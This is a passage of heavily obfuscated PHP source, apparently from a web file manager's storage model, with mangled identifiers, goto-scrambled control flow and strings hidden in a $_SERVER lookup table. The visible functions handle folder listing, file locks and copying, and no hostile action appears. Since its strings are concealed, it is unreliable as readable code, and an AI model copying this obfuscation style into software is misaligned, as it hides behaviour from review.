($ağß²öäÊÒ == 0 && $a¨öùô®¾Ú && $f±“ é ˆË[$FêòÆö³¨[398]] == self::TYPE_GROUP) { continue; } if (isset($FàÑ¼—ªĞâ[$D°Î‡ã·£])) { $a¨öùô®¾Ú .= $FàÑ¼—ªĞâ[$D°Î‡ã·£] . $FêòÆö³¨[8]; } } if ($DÍƒŒ­İŠ·) { $a¨öùô®¾Ú .= $f±“ é ˆË[$FêòÆö³¨[28]]; } $aˆ¶½‘â¦´[$AÈÀâ‹ÙáÁ] = $a¨öùô®¾Ú; } if ($f±“ é ˆË[$FêòÆö³¨[397]]) { $a¨öùô®¾Ú .= $FêòÆö³¨[8]; } goto C¯áÎˆºÉØ; bÛ¾°ÉŒç: if (intval($f±“ é ˆË[$FêòÆö³¨[398]]) == self::TYPE_SYSTEM) { $this->_listAppendPathRecycle($f±“ é ˆË, $DÍƒŒ­İŠ·, $CõÇéÊá…‡); } goto aĞÈ†¿­ÉŸ; C¯áÎˆºÉØ: $f±“ é ˆË[$FêòÆö³¨[489]] = str_replace($FêòÆö³¨[490], $FêòÆö³¨[8], $a¨öùô®¾Ú); $Có¾°‡ÊÇ„ = trim($f±“ é ˆË[$FêòÆö³¨[489]], $FêòÆö³¨[8]); if ($f±“ é ˆË[$FêòÆö³¨[472]] == $FêòÆö³¨[491] && $Có¾°‡ÊÇ„) { $f±“ é ˆË[$FêòÆö³¨[28]] = $Có¾°‡ÊÇ„; } goto bÛ¾°ÉŒç; aĞÈ†¿­ÉŸ: } goto DéÕƒ–Ú‘; d¬¾ƒŸ“¥: $eö—º’ˆÁÓ = array_unique($eö—º’ˆÁÓ); if (count($eö—º’ˆÁÓ) > 0) { $eí˜¨Œ¯˜¸ = array($FêòÆö³¨[404] => array($FêòÆö³¨[405], $eö—º’ˆÁÓ)); if (count($eö—º’ˆÁÓ) == 1) { $cŞ–é°¯™ä = $this->sourceInfo($eö—º’ˆÁÓ[0]); $bŒ´±áË = is_array($cŞ–é°¯™ä) ? array($cŞ–é°¯™ä) : !1; } else { $bŒ´±áË = $this->field($FêòÆö³¨[487])->where($eí˜¨Œ¯˜¸)->select(); } if (!$bŒ´±áË) { $bŒ´±áË = array(); } foreach ($bŒ´±áË as $B…ì¥Ê­­Ù) { $FàÑ¼—ªĞâ[$B…ì¥Ê­­Ù[$FêòÆö³¨[390]]] = $B…ì¥Ê­­Ù[$FêòÆö³¨[28]]; } } $CõÇéÊá…‡ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); goto EÉæÒ£»Á; DéÕƒ–Ú‘: unset($f±“ é ˆË); return $e£ºö£ ¬; goto Aéƒ—èáâÓ; C‹†¬Èù : $FÃîìÉìá¢ = array(); foreach ($e£ºö£ ¬ as &$f±“ é ˆË) { $bÀ¬·ß„£ = $f±“ é ˆË[$FêòÆö³¨[397]] == $FêòÆö³¨[86]; if ($bÀ¬·ß„£) { $FàÑ¼—ªĞâ[$f±“ é ˆË[$FêòÆö³¨[390]]] = $f±“ é ˆË[$FêòÆö³¨[28]]; } if (isset($FÃîìÉìá¢[$f±“ é ˆË[$FêòÆö³¨[481]]])) { continue; } $FÃîìÉìá¢[$f±“ é ˆË[$FêòÆö³¨[481]]] = !0; $DÍƒŒ­İŠ· = $this->parentLevelArray($f±“ é ˆË[$FêòÆö³¨[481]]); foreach ($DÍƒŒ­İŠ· as $ağß²öäÊÒ => $D°Î‡ã·£) { if ($ağß²öäÊÒ != 0 && !isset($FàÑ¼—ªĞâ[$D°Î‡ã·£])) { $eö—º’ˆÁÓ[] = $D°Î‡ã·£; } } } unset($f±“ é ˆË); goto d¬¾ƒŸ“¥; fÄÙ…¤š™: $FêòÆö³¨ =& $_SERVER[Š‰]; static $FàÑ¼—ªĞâ = array(); $eö—º’ˆÁÓ = array(); goto C‹†¬Èù ; Aéƒ—èáâÓ: } private function _listAppendPathRecycle(&$A‘’Š¾ˆ, $E²‹ÃçÉë, $eùÃ©õÂˆ) { goto BˆÁŞªÜ“£; BˆÁŞªÜ“£: $FŠçÖ£Ñ¨Ş =& $_SERVER[Š‰]; if (!in_array($eùÃ©õÂˆ, $E²‹ÃçÉë) && $A‘’Š¾ˆ[$FŠçÖ£Ñ¨Ş[390]] != $eùÃ©õÂˆ) { return; } $B˜²§ôÇƒÔ = explode($FŠçÖ£Ñ¨Ş[8], trim($A‘’Š¾ˆ[$FŠçÖ£Ñ¨Ş[489]], $FŠçÖ£Ñ¨Ş[8])); goto EÀ÷‡‚ÃÃ¨; EëùïÂïÄŠ: if ($A‘’Š¾ˆ[$FŠçÖ£Ñ¨Ş[390]] == $eùÃ©õÂˆ) { $A‘’Š¾ˆ[$FŠçÖ£Ñ¨Ş[481]] = $FŠçÖ£Ñ¨Ş[493]; $A‘’Š¾ˆ[$FŠçÖ£Ñ¨Ş[472]] = $FŠçÖ£Ñ¨Ş[491]; $A‘’Š¾ˆ[$FŠçÖ£Ñ¨Ş[28]] = LNG($FŠçÖ£Ñ¨Ş[492]); } $A‘’Š¾ˆ[$FŠçÖ£Ñ¨Ş[494]] = $FŠçÖ£Ñ¨Ş[495]; goto eØ‘×ÇñÃ; EÀ÷‡‚ÃÃ¨: $F¤ç¸ÚÙ = implode($FŠçÖ£Ñ¨Ş[8], array_slice($B˜²§ôÇƒÔ, 2)); $A‘’Š¾ˆ[$FŠçÖ£Ñ¨Ş[489]] = $FŠçÖ£Ñ¨Ş[8] . LNG($FŠçÖ£Ñ¨Ş[492]) . $FŠçÖ£Ñ¨Ş[8] . ltrim($F¤ç¸ÚÙ, $FŠçÖ£Ñ¨Ş[8]); $A‘’Š¾ˆ[$FŠçÖ£Ñ¨Ş[481]] = $FŠçÖ£Ñ¨Ş[493] . implode($FŠçÖ£Ñ¨Ş[47], array_slice($E²‹ÃçÉë, 1)) . $FŠçÖ£Ñ¨Ş[47]; goto EëùïÂïÄŠ; eØ‘×ÇñÃ: } protected function _listAppendPathRoot(&$B„‘äß»ï†, $Aš‚·Ï–ğ) { $dñã‹¨Û¾ =& $_SERVER[Š‰]; $B¹ä…’ Ã† = $dñã‹¨Û¾[33]; if ($B„‘äß»ï†[$dñã‹¨Û¾[398]] == self::TYPE_USER) { if (defined($dñã‹¨Û¾[448]) && $B„‘äß»ï†[$dñã‹¨Û¾[478]] == USER_ID) { $B¹ä…’ Ã† = LNG($dñã‹¨Û¾[496]); if (!$Aš‚·Ï–ğ) { $B„‘äß»ï†[$dñã‹¨Û¾[28]] = $B¹ä…’ Ã†; } } else { $F·Ñ‘³ë’¨ = Model($dñã‹¨Û¾[497])->getInfoSimple($B„‘äß»ï†[$dñã‹¨Û¾[478]]); $B¹ä…’ Ã† = LNG($dñã‹¨Û¾[498]) . $dñã‹¨Û¾[159] . $F·Ñ‘³ë’¨[$dñã‹¨Û¾[28]] . $dñã‹¨Û¾[499]; } } else { if ($B„‘äß»ï†[$dñã‹¨Û¾[398]] == self::TYPE_GROUP) { $F·Ñ‘³ë’¨ = Model($dñã‹¨Û¾[480])->getInfoSimple($B„‘äß»ï†[$dñã‹¨Û¾[478]]); $B¹ä…’ Ã† = $F·Ñ‘³ë’¨[$dñã‹¨Û¾[28]]; } else { if ($B„‘äß»ï†[$dñã‹¨Û¾[398]] == self::TYPE_SYSTEM) { $B¹ä…’ Ã† = $dñã‹¨Û¾[500]; } } } $B¹ä…’ Ã† = $B¹ä…’ Ã† ? $dñã‹¨Û¾[8] . $B¹ä…’ Ã† . $dñã‹¨Û¾[8] : $dñã‹¨Û¾[8]; return $B¹ä…’ Ã†; } protected function _listAppendUser(&$a–é™…ƒË) { goto bœ§ŠÚÏÖ; BÉŠ¨Í‰Ò³: $c‰‚’“ª× = array_merge($F¬ì´õİÈ, $F¢‰ñÓâ¿’); $a…İ¸š‹†¡ = Model($A…¬ˆÇÕŒ›[501])->userListInfo($c‰‚’“ª×); foreach ($a–é™…ƒË as &$dÛ¹æ‰†‚Ÿ) { $bæíñŒªÀá = $dÛ¹æ‰†‚Ÿ[$A…¬ˆÇÕŒ›[426]]; $dÛ¹æ‰†‚Ÿ[$A…¬ˆÇÕŒ›[426]] = $a…İ¸š‹†¡[$bæíñŒªÀá] ? $a…İ¸š‹†¡[$bæíñŒªÀá] : !1; $bæíñŒªÀá = $dÛ¹æ‰†‚Ÿ[$A…¬ˆÇÕŒ›[428]]; $dÛ¹æ‰†‚Ÿ[$A…¬ˆÇÕŒ›[428]] = $a…İ¸š‹†¡[$bæíñŒªÀá] ? $a…İ¸š‹†¡[$bæíñŒªÀá] : !1; if (isset($dÛ¹æ‰†‚Ÿ[$A…¬ˆÇÕŒ›[439]]) && $dÛ¹æ‰†‚Ÿ[$A…¬ˆÇÕŒ›[439]][$A…¬ˆÇÕŒ›[502]]) { $b‹è›¤õ‘ = $GLOBALS[$A…¬ˆÇÕŒ›[6]][$A…¬ˆÇÕŒ›[87]][$A…¬ˆÇÕŒ›[503]]; if ($dÛ¹æ‰†‚Ÿ[$A…¬ˆÇÕŒ›[439]][$A…¬ˆÇÕŒ›[504]] <= time() - $b‹è›¤õ‘) { $this->metaSet($dÛ¹æ‰†‚Ÿ[$A…¬ˆÇÕŒ›[390]], $A…¬ˆÇÕŒ›[502], null); $this->metaSet($dÛ¹æ‰†‚Ÿ[$A…¬ˆÇÕŒ›[390]], $A…¬ˆÇÕŒ›[504], null); unset($dÛ¹æ‰†‚Ÿ[$A…¬ˆÇÕŒ›[439]][$A…¬ˆÇÕŒ›[502]]); continue; } $bÉÉ‚æÃ…… = $dÛ¹æ‰†‚Ÿ[$A…¬ˆÇÕŒ›[439]][$A…¬ˆÇÕŒ›[502]]; $dÛ¹æ‰†‚Ÿ[$A…¬ˆÇÕŒ›[439]][$A…¬ˆÇÕŒ›[505]] = Model($A…¬ˆÇÕŒ›[501])->getInfoSimpleOuter($bÉÉ‚æÃ……); } } goto BÒí‰•…ì«; bœ§ŠÚÏÖ: $A…¬ˆÇÕŒ› =& $_SERVER[Š‰]; $F¬ì´õİÈ = array_to_keyvalue($a–é™…ƒË, $A…¬ˆÇÕŒ›[33], $A…¬ˆÇÕŒ›[426]); $F¢‰ñÓâ¿’ = array_to_keyvalue($a–é™…ƒË, $A…¬ˆÇÕŒ›[33], $A…¬ˆÇÕŒ›[428]); goto BÉŠ¨Í‰Ò³; BÒí‰•…ì«: unset($dÛ¹æ‰†‚Ÿ); goto dõƒ‚ù¸›”; dõƒ‚ù¸›”: } public function parentLevelArray($bŸ‰ÆÊİ›³) { $DĞ‰Êâ‚‚Í =& $_SERVER[Š‰]; $bŸ‰ÆÊİ›³ = explode($DĞ‰Êâ‚‚Í[47], trim($bŸ‰ÆÊİ›³, $DĞ‰Êâ‚‚Í[47])); return array_remove_value($bŸ‰ÆÊİ›³, $DĞ‰Êâ‚‚Í[491]); } public function listAll($a¨ãëëåÃ¿) { goto C‹óô©ñ—; C‹óô©ñ—: $cöìòê =& $_SERVER[Š‰]; $e¼Ä“ë÷É± = $this->sourceInfo($a¨ãëëåÃ¿); $eª®çÛµÓà = array($cöìòê[506] => array($cöìòê[507], $e¼Ä“ë÷É±[$cöìòê[481]] . $a¨ãëëåÃ¿ . $cöìòê[508]), $cöìòê[509] => 0); goto D×¿Á¹È ¨; fåì…›Ïç×: $this->_listAppendAuth($D„”±‰Š‰Š); $this->_listAppendUser($D„”±‰Š‰Š); $this->_listAppendPath($D„”±‰Š‰Š); goto f¨­Ÿº¶ö„; f¨­Ÿº¶ö„: $D„”±‰Š‰Š = array_to_keyvalue($D„”±‰Š‰Š, $cöìòê[390]); $B¯Š‡ºÓì = "\57{$e¼Ä“ë÷É±[$cöìòê[28]]}\x2f"; $B¯Š‡ºÓì = $B¯Š‡ºÓì == $cöìòê[490] ? $cöìòê[8] : $B¯Š‡ºÓì; goto CÕ‘ÍƒÕî; CÕ‘ÍƒÕî: $D›ù©Ì§Ë± = array(); foreach ($D„”±‰Š‰Š as $EÅØŠº‰­Ù => $bÈè÷çÈ¢ò) { goto B¾àë²óÂ†; D ¥œ‡å”¤: $b˜Ò“‚±‹Û = str_replace($cöìòê[490], $cöìòê[8], $b˜Ò“‚±‹Û); $b˜Ò“‚±‹Û = str_replace($cöìòê[490], $cöìòê[8], $b˜Ò“‚±‹Û); $bŒÙÏŞ·‚ = array($cöìòê[408] => str_replace($cöìòê[490], $cöìòê[8], $b˜Ò“‚±‹Û), $cöìòê[512] => intval($bÈè÷çÈ¢ò[$cöìòê[397]]), $cöìòê[84] => $this->pathInfoFilter($bÈè÷çÈ¢ò)); goto dæ‘óˆÏ‰; B¾àë²óÂ†: $F“ÃÂ÷Üæ¼ = $this->parentLevelArray($bÈè÷çÈ¢ò[$cöìòê[481]]); array_shift($F“ÃÂ÷Üæ¼); $b˜Ò“‚±‹Û = $B¯Š‡ºÓì; goto E­ÀšË šÏ; dæ‘óˆÏ‰: if (!$bÈè÷çÈ¢ò[$cöìòê[397]]) { $bŒÙÏŞ·‚[$cöìòê[441]] = $bÈè÷çÈ¢ò[$cöìòê[441]]; $bŒÙÏŞ·‚[$cöìòê[85]] = $bÈè÷çÈ¢ò[$cöìòê[75]]; } $D›ù©Ì§Ë±[] = $bŒÙÏŞ·‚; goto eŠø÷Ôô™¾; E­ÀšË šÏ: for ($A…›ôÀìã© = 0; $A…›ôÀìã© < count($F“ÃÂ÷Üæ¼); $A…›ôÀìã©++) { $b˜Ò“‚±‹Û .= $D„”±‰Š‰Š[$F“ÃÂ÷Üæ¼[$A…›ôÀìã©]][$cöìòê[28]] . $cöìòê[8]; } $b˜Ò“‚±‹Û .= $bÈè÷çÈ¢ò[$cöìòê[28]]; if ($bÈè÷çÈ¢ò[$cöìòê[397]]) { $b˜Ò“‚±‹Û .= $cöìòê[8]; } goto D ¥œ‡å”¤; eŠø÷Ôô™¾: } return $D›ù©Ì§Ë±; goto D’ÔÌÈòÌ—; D×¿Á¹È ¨: $AÅ¢ª®Ğàò = $cöìòê[510]; $côë½Åßæ— = "\x4c\x45\x46\x54\x20\x4a\x4f\x49\x4e\x20{$this->tablePrefix}\151\x6f\x5f\x66\151\154\145\x20\146\x69\154\x65\40\157\x6e\40\163\157\x75\x72\x63\145\x2e\x66\x69\x6c\145\111\104\40\75\40\146\151\x6c\x65\56\146\x69\154\x65\111\x44"; $D„”±‰Š‰Š = $this->alias($cöìòê[511])->field($AÅ¢ª®Ğàò)->where($eª®çÛµÓà)->join($côë½Åßæ—)->select(); goto fåì…›Ïç×; D’ÔÌÈòÌ—: } } class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public $moveClearAuth = true; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($e«Ä†æÈ) { goto e˜†ôƒŸÈ‡; a¿¦¯Šì: $Fµ –‚ğÃÈ = 1; $this->_lockEvent($e«Ä†æÈ, array($F×šàóæÍŠ[514], $F×šàóæÍŠ[515]), $Fµ –‚ğÃÈ); $this->_lockParent($e«Ä†æÈ, array($F×šàóæÍŠ[515]), $Fµ –‚ğÃÈ); goto D‚ßá™µ¼›; D‚ßá™µ¼›: $this->_lockEvent($e«Ä†æÈ, array($F×šàóæÍŠ[516], $F×šàóæÍŠ[517]), $Fµ –‚ğÃÈ); $this->_lockCheckEnd($F×šàóæÍŠ[513], $e«Ä†æÈ); goto B¯–êˆØ§œ; e˜†ôƒŸÈ‡: $F×šàóæÍŠ =& $_SERVER[Š‰]; if (!$this->allowLock()) { return; } $this->_lockCheck($F×šàóæÍŠ[513], $e«Ä†æÈ); goto a¿¦¯Šì; B¯–êˆØ§œ: } public function lockCopyEnd($e«˜™ŸËª) { $C‚§ßŸ ¾È =& $_SERVER[Š‰]; if (!$this->allowLock()) { return; } $fÇõï‹ªÇæ = 0; $this->_lockEvent($e«˜™ŸËª, array($C‚§ßŸ ¾È[514], $C‚§ßŸ ¾È[515]), $fÇõï‹ªÇæ); $this->_lockParent($e«˜™ŸËª, array($C‚§ßŸ ¾È[515]), $fÇõï‹ªÇæ); $this->_lockEvent($e«˜™ŸËª, array($C‚§ßŸ ¾È[516], $C‚§ßŸ ¾È[517]), $fÇõï‹ªÇæ); } public function lockWriteStart($aŒÍ†İãó, $EÕ¡ÜŞ¡¶· = '') { goto aˆàÜ‹‡«; d‘ªÚˆ‹—: $this->_lockParent($aŒÍ†İãó, array($FØáã–ªß³[513], $FØáã–ªß³[515]), $BÎÉ”˜¤ç„); $this->_lockCheckEnd($FØáã–ªß³[514], $aŒÍ†İãó); goto a©‹ßŸº¬; aªÇÕ–Ô¿‘: $BÎÉ”˜¤ç„ = 1; $this->_lockKey($FØáã–ªß³[518] . $aŒÍ†İãó . $FØáã–ªß³[94] . $EÕ¡ÜŞ¡¶·, $BÎÉ”˜¤ç„); $this->_lockEvent($aŒÍ†İãó, array($FØáã–ªß³[513], $FØáã–ªß³[515]), $BÎÉ”˜¤ç„); goto d‘ªÚˆ‹—; aˆàÜ‹‡«: $FØáã–ªß³ =& $_SERVER[Š‰]; if (!$this->allowLock()) { return; } $this->_lockCheck($FØáã–ªß³[514], $aŒÍ†İãó); goto aªÇÕ–Ô¿‘; a©‹ßŸº¬: } public function lockWriteEnd($c£ô¸…¾Ü‹, $EÄË«¯Şâ… = '') { $eë‡èèÒÀ² =& $_SERVER[Š‰]; if (!$this->allowLock()) { return; } $Aòç²¹®æÍ = 0; $this->_lockKey($eë‡èèÒÀ²[518] . $c£ô¸…¾Ü‹ . $eë‡èèÒÀ²[94] . $EÄË«¯Şâ…, $Aòç²¹®æÍ); $this->_lockEvent($c£ô¸…¾Ü‹, array($eë‡èèÒÀ²[513], $eë‡èèÒÀ²[515]), $Aòç²¹®æÍ); $this->_lockParent($c£ô¸…¾Ü‹, array($eë‡èèÒÀ²[513], $eë‡èèÒÀ²[515]), $Aòç²¹®æÍ); } public function lockMoveStart($BßÄ‘—¢) { goto E§¥“ª×©ï; E§¥“ª×©ï: $fÅ«Õãåß¦ =& $_SERVER[Š‰]; if (!$this->allowLock()) { return; } $this->_lockCheck($fÅ«Õãåß¦[515], $BßÄ‘—¢); goto B†÷Ğ§§øÒ; d©ãº«Œ­: $this->_lockParent($BßÄ‘—¢, array($fÅ«Õãåß¦[513], $fÅ«Õãåß¦[515]), $dÃ±ÒåÅ¨); $this->_lockEvent($BßÄ‘—¢, array($fÅ«Õãåß¦[520], $fÅ«Õãåß¦[516], $fÅ«Õãåß¦[517]), $dÃ±ÒåÅ¨); $this->_lockCheckEnd($fÅ«Õãåß¦[515], $BßÄ‘—¢); goto f¹‹ š•Æƒ; B†÷Ğ§§øÒ: $dÃ±ÒåÅ¨ = 1; $this->_lockKey($fÅ«Õãåß¦[519] . $BßÄ‘—¢, $dÃ±ÒåÅ¨); $this->_lockEvent($BßÄ‘—¢, array($fÅ«Õãåß¦[513], $fÅ«Õãåß¦[514]), $dÃ±ÒåÅ¨); goto d©ãº«Œ­; f¹‹ š•Æƒ: } public function lockMoveEnd($A¥‡¼“¦ÆŠ) { goto E °ÜŒâ²; BŞóëÛ˜Œ³: $this->_lockEvent($A¥‡¼“¦ÆŠ, array($CÑËŒ¶ºŒ[520], $CÑËŒ¶ºŒ[516], $CÑËŒ¶ºŒ[517]), $FÇÇÆôíË”); goto aë‚Ö›®Ø; E °ÜŒâ²: $CÑËŒ¶ºŒ =& $_SERVER[Š‰]; if (!$this->allowLock()) { return; } $FÇÇÆôíË” = 0; goto Aš‡„ö÷î; Aš‡„ö÷î: $this->_lockKey($CÑËŒ¶ºŒ[519] . $A¥‡¼“¦ÆŠ, $FÇÇÆôíË”); $this->_lockEvent($A¥‡¼“¦ÆŠ, array($CÑËŒ¶ºŒ[513], $CÑËŒ¶ºŒ[514]), $FÇÇÆôíË”); $this->_lockParent($A¥‡¼“¦ÆŠ, array($CÑËŒ¶ºŒ[513], $CÑËŒ¶ºŒ[515]), $FÇÇÆôíË”); goto BŞóëÛ˜Œ³; aë‚Ö›®Ø: } private function _lockCheck($d¤·‡¸îÇ–, $c·ø‹Ù˜¶) { goto FùÖâŒ“¼³; b®½Şğ¬œ: $this->_lockTimeStart[$dğ•ÏæŒ] = timeFloat(); if (!is_array($D½™’Áß¯—)) { return; } $aøÏ—Çª¼Ñ = LNG($E‡¾İÎÆ‹[521]); goto c¯®­ªªô; c¯®­ªªô: CacheLock::setErrorMsg($E‡¾İÎÆ‹[159] . htmlspecialchars($D½™’Áß¯—[$E‡¾İÎÆ‹[28]]) . $E‡¾İÎÆ‹[499] . $aøÏ—Çª¼Ñ); $this->_lockKey($dğ•ÏæŒ, 1); $this->_lockKey($dğ•ÏæŒ, 0); goto BØºÕ„¥; FùÖâŒ“¼³: $E‡¾İÎÆ‹ =& $_SERVER[Š‰]; $D½™’Áß¯— = $this->sourceInfo($c·ø‹Ù˜¶); $dğ•ÏæŒ = $d¤·‡¸îÇ– . $E‡¾İÎÆ‹[94] . $c·ø‹Ù˜¶; goto b®½Şğ¬œ; BØºÕ„¥: $dÌİìåÆ² = array_reverse($this->parentLevelArray($D½™’Áß¯—[$E‡¾İÎÆ‹[481]])); foreach ($dÌİìåÆ² as $Dµ¯¶˜åÜÅ) { $dğ•ÏæŒ = $d¤·‡¸îÇ– . $E‡¾İÎÆ‹[522] . $Dµ¯¶˜åÜÅ; if (CacheLock::lockGet($E‡¾İÎÆ‹[523] . $dğ•ÏæŒ)) { $D½™’Áß¯— = $this->sourceInfo($Dµ¯¶˜åÜÅ); CacheLock::setErrorMsg($E‡¾İÎÆ‹[159] . htmlspecialchars($D½™’Áß¯—[$E‡¾İÎÆ‹[28]]) . $E‡¾İÎÆ‹[499] . $aøÏ—Çª¼Ñ); $this->_lockKey($dğ•ÏæŒ, 1); $this->_lockKey($dğ•ÏæŒ, 0); } } goto eÇÕ¿°ïØò; eÇÕ¿°ïØò: } private function _lockCheckEnd($båµĞÃÑ¢å, $eÓ»”ƒ†±ğ) { goto E³òÊø¶šÈ; Aô±’ƒ‰: if ($e”Ñ²ƒ§ì¸ > 0.5) { unset(self::$cacheSourceInfo[$d¡âçÅ§‡Ì[432] . $eÓ»”ƒ†±ğ]); } $DäŸæÊÛÔˆ = $this->sourceInfo($eÓ»”ƒ†±ğ); if (!$DäŸæÊÛÔˆ) { show_json(LNG($d¡âçÅ§‡Ì[104]), !1); } goto D›Ì‘óÜ²„; E³òÊø¶šÈ: $d¡âçÅ§‡Ì =& $_SERVER[Š‰]; $bà¿İùÊÜ° = $båµĞÃÑ¢å . $d¡âçÅ§‡Ì[94] . $eÓ»”ƒ†±ğ; CacheLock::setErrorMsg($d¡âçÅ§‡Ì[373]); goto f¦ó ´Ê¨™; f¦ó ´Ê¨™: if (!isset($this->_lockTimeStart[$bà¿İùÊÜ°])) { return; } $e”Ñ²ƒ§ì¸ = timeFloat() - $this->_lockTimeStart[$bà¿İùÊÜ°]; unset($this->_lockTimeStart[$bà¿İùÊÜ°]); goto Aô±’ƒ‰; D›Ì‘óÜ²„: } private function _lockParent($aã§ùÅ™™è, $câ¼°ó¼å—, $Fª¢¼¢øÄ˜) { if (!$this->autoLockSet) { return; } $e«á“™Å© = $this->sourceInfo($aã§ùÅ™™è); if (!is_array($e«á“™Å©)) { return; } $Cµ¡çÔÌŠˆ = array_reverse($this->parentLevelArray($e«á“™Å©[$_SERVER[Š‰][481]])); foreach ($Cµ¡çÔÌŠˆ as $C‘â£Ş†ÄÈ) { $this->_lockEvent($C‘â£Ş†ÄÈ, $câ¼°ó¼å—, $Fª¢¼¢øÄ˜); } } private function _lockEvent($C”ŸŸâá÷, $F‡áİ¦È™æ, $eéÄåŠ—œ‹) { $EÍ“ë¸ÓÌÎ =& $_SERVER[Š‰]; if (!$this->autoLockSet) { return; } foreach ($F‡áİ¦È™æ as $a¥†„¤Íè) { $aùó™ğÅµ„ = $a¥†„¤Íè . $EÍ“ë¸ÓÌÎ[94] . $C”ŸŸâá÷; if ($eéÄåŠ—œ‹ && CacheLock::lockGet($EÍ“ë¸ÓÌÎ[523] . $aùó™ğÅµ„)) { continue; } $this->_lockKey($aùó™ğÅµ„, $eéÄåŠ—œ‹); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($B…ÜêÃá¡©, $eù‚Ó³Çò = 1) { $c²ã…×”ã¨ = $_SERVER[Š‰][523] . md5($B…ÜêÃá¡©); if ($eù‚Ó³Çò) { if (isset(self::$_lockItemArr[$c²ã…×”ã¨])) { return; } self::$_lockItemArr[$c²ã…×”ã¨] = 1; CacheLock::lock($c²ã…×”ã¨, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$c²ã…×”ã¨])) { return; } unset(self::$_lockItemArr[$c²ã…×”ã¨]); CacheLock::unlock($c²ã…×”ã¨); } } public function isParentOf($c¾³·ÌçÅè, $f´ šÉç‹ø) { goto b²Â‹¡¹; fçÁòæ¾Ò¶: $cÔíÁÃâƒ = $FˆÜÁ„†Ã[$Dá¦¦¦Ëª»[481]] . $FˆÜÁ„†Ã[$Dá¦¦¦Ëª»[390]] . $Dá¦¦¦Ëª»[47]; $dµ·ßÕçŸ = $dô‘ˆóÔäõ[$Dá¦¦¦Ëª»[481]] . $dô‘ˆóÔäõ[$Dá¦¦¦Ëª»[390]] . $Dá¦¦¦Ëª»[47]; $Cô³¤»¢‡ = strpos($dµ·ßÕçŸ, $cÔíÁÃâƒ) === 0; goto cšåÈØîÉ; cšåÈØîÉ: return $Cô³¤»¢‡; goto DÈÜ¢‹Ï“†; b²Â‹¡¹: $Dá¦¦¦Ëª» =& $_SERVER[Š‰]; $FˆÜÁ„†Ã = $this->sourceInfo($c¾³·ÌçÅè); $dô‘ˆóÔäõ = $this->sourceInfo($f´ šÉç‹ø); goto fçÁòæ¾Ò¶; DÈÜ¢‹Ï“†: } private $targetIsDelete = 0; public function copy($f­ËªÅï¨, $cÚ›âª¾†, $e¾é…é–¦ = REPEAT_REPLACE, $Eß„Œ­±æ = '') { goto BŠàÏ½†ö§; b¬Í¦›À›Û: $this->saveAll($b©òîƒ¸å[$F¿éŒ£»î”[526]]); Model($F¿éŒ£»î”[173])->linkAdd($b©òîƒ¸å[$F¿éŒ£»î”[524]]); $this->folderSizeReset($cÚ›âª¾†); goto fŞÔ‹°©º; fœÒ‹‚«ÕÚ: $this->targetIsDelete = intval($EôÌí¡ãÓ[$F¿éŒ£»î”[417]]); $Cö†‡Š¾’ = $this->fileNameExistCache($cÚ›âª¾†, $EôÌí¡ãÓ[$F¿éŒ£»î”[28]]); $D¡½À–ÑŠÍ = $this->_copy($f­ËªÅï¨, $cÚ›âª¾†, $e¾é…é–¦, $b©òîƒ¸å, !0, $Eß„Œ­±æ); goto c…¢Ü¥í ò; c…¢Ü¥í ò: $this->_childrenListClear(); $this->lockCopyEnd($f­ËªÅï¨); $this->lockWriteEnd($cÚ›âª¾†, $fô©Œ†®ˆÃ); goto Eé—Š«§Âì; Eé—Š«§Âì: if ($EôÌí¡ãÓ[$F¿éŒ£»î”[397]] == $F¿éŒ£»î”[86] && $Cö†‡Š¾’ == $D¡½À–ÑŠÍ) { $this->folderSizeResetChildren($Cö†‡Š¾’); } Model($F¿éŒ£»î”[527])->addAll($b©òîƒ¸å[$F¿éŒ£»î”[525]], array(), !0); if ($Cö†‡Š¾’ != $D¡½À–ÑŠÍ || $EôÌí¡ãÓ[$F¿éŒ£»î”[397]] == $F¿éŒ£»î”[86]) { Model($F¿éŒ£»î”[528])->eventCopy($D¡½À–ÑŠÍ); } goto b¬Í¦›À›Û; fŞÔ‹°©º: $this->updateModifyTime($cÚ›âª¾†); return $D¡½À–ÑŠÍ; goto b¦æ²¸Ü‘˜; fŒåßÎ•ï¿: $this->lockCopyStart($f­ËªÅï¨); $this->lockWriteStart($cÚ›âª¾†, $fô©Œ†®ˆÃ); $b©òîƒ¸å = array($F¿éŒ£»î”[524] => array(), $F¿éŒ£»î”[525] => array(), $F¿éŒ£»î”[526] => array()); goto fœÒ‹‚«ÕÚ; câŞí­¢¤Ü: if (!$EôÌí¡ãÓ || !$d§Ğ¥­ÒÒ || $d§Ğ¥­ÒÒ[$F¿éŒ£»î”[397]] != $F¿éŒ£»î”[86]) { return !1; } if ($this->isParentOf($f­ËªÅï¨, $cÚ›âª¾†)) { return !1; } $fô©Œ†®ˆÃ = $Eß„Œ­±æ ? $Eß„Œ­±æ : $EôÌí¡ãÓ[$F¿éŒ£»î”[28]]; goto fŒåßÎ•ï¿; BŠàÏ½†ö§: $F¿éŒ£»î” =& $_SERVER[Š‰]; $EôÌí¡ãÓ = $this->sourceInfo($f­ËªÅï¨); $d§Ğ¥­ÒÒ = $this->sourceInfo($cÚ›âª¾†); goto câŞí­¢¤Ü; b¦æ²¸Ü‘˜: } private function _copy($AŠï‹ĞÇã¾, $DÒíó›½˜æ, $BĞš»¶, &$d½–øò×ê, $D±ÕŠå—ß, $fò…ì‹ªÈ° = '') { goto BÌËÒ¾êŸÒ; e¦’¹›ƒæ: if (!$B†ãÜß¬¦Ø) { return $this->_copyCreate($AŠï‹ĞÇã¾, $DÒíó›½˜æ, $eä¡¶ƒ­ãë, $d½–øò×ê); } $BğÍÇ¢ù‰˜ = $B†ãÜß¬¦Ø; if ($f»£‡®áğ‡) { if ($BĞš»¶ == REPEAT_RENAME_FOLDER) { $eä¡¶ƒ­ãë = $this->fileNameAutoCache($DÒíó›½˜æ, $eä¡¶ƒ­ãë, $BĞš»¶, $f»£‡®áğ‡); $BğÍÇ¢ù‰˜ = $this->_copyCreate($AŠï‹ĞÇã¾, $DÒíó›½˜æ, $eä¡¶ƒ­ãë, $d½–øò×ê); } else { $Fß·íŒ†¦ = $this->_childrenList($AŠï‹ĞÇã¾); foreach ($Fß·íŒ†¦ as $e¸’”¡¬£) { $this->_copy($e¸’”¡¬£[$Bê„¨ˆòšª[390]], 